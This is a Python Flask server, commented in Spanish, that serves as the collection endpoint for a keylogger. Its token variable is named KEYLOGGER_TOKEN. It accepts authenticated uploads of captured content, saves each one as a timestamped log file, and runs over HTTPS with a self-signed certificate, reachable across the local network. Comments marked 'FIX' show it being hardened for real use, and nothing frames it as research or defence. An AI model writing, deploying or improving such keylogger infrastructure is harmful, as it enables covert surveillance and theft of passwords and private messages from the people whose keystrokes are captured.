# Servidor.py
from flask import Flask, request, jsonify
from datetime import datetime
from uuid import uuid4
import os

app = Flask(__name__)

# Límite máximo de contenido: 1 MB
app.config["MAX_CONTENT_LENGTH"] = 1 * 1024 * 1024

CARPETA_LOGS = "logs_recibidos"

# >>> FIX: token desde variable de entorno (con fallback para pruebas)
TOKEN_SECRETO = os.environ.get(
    "KEYLOGGER_TOKEN",
    "cambia_esto_por_algo_largo_y_aleatorio_12345"
)

# >>> FIX: rutas al certificado autofirmado
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"

os.makedirs(CARPETA_LOGS, exist_ok=True)


@app.route("/upload", methods=["POST"])
def recibir_log():
    # 1. Verificar token de autenticación
    if request.headers.get("X-Auth-Token") != TOKEN_SECRETO:
        return jsonify({"error": "No autorizado"}), 401

    # 2. Validar datos recibidos
    datos = request.get_json()
    if not datos or "contenido" not in datos:
        return jsonify({"error": "Datos inválidos"}), 400

    # 3. Generar nombre único
    nombre = f"log_{datetime.now():%Y%m%d_%H%M%S}_{uuid4().hex[:6]}.txt"
    ruta = os.path.join(CARPETA_LOGS, nombre)

    # 4. Guardar contenido
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(datos["contenido"])

    print(f"[+] Log recibido: {nombre}")
    return jsonify({"ok": True, "archivo": nombre}), 200


if __name__ == "__main__":
    # >>> FIX: verificar que el certificado exista antes de arrancar
    if not (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)):
        print("[!] No se encontró cert.pem o key.pem.")
        print("[!] Corre primero: python generar_cert.py")
        raise SystemExit(1)

    print("[+] Servidor HTTPS iniciado en https://0.0.0.0:5000")
    print(f"[+] Certificado: {CERT_FILE} | Clave: {KEY_FILE}")
    print("[+] Accesible desde la red local en https://<TU_IP>:5000")

    app.run(
        host="0.0.0.0",
        port=5000,
        debug=False,
        ssl_context=(CERT_FILE, KEY_FILE),   # >>> FIX: HTTPS
    )